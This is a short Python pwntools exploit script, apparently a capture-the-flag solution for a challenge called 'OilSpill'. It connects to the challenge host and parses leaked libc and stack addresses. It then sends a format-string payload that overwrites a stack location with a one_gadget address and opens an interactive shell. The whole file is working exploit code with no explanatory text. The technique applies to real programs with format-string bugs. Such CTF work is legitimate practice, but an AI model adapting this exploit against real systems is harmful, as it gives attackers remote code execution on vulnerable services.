from pwn import *

context.binary = './OilSpill_patched'
libc = ELF('./libc-2.27.so')
elf = ELF('./OilSpill_patched')
# p = elf.process()
p = remote('oil.sdc.tf', 1337)

libc.address = int(p.recvuntil(b',')[:-1], 16) - libc.sym.puts
print(hex(libc.address))

one_gadget = libc.address + 0x10a2fc
system = libc.sym.system

p.recvuntil(b', ')
stack_leak = int(p.recvuntil(b',')[:-1], 16) + 0x148

fmt = fmtstr_payload(8, {stack_leak:one_gadget})

p.sendline(fmt)

p.interactive()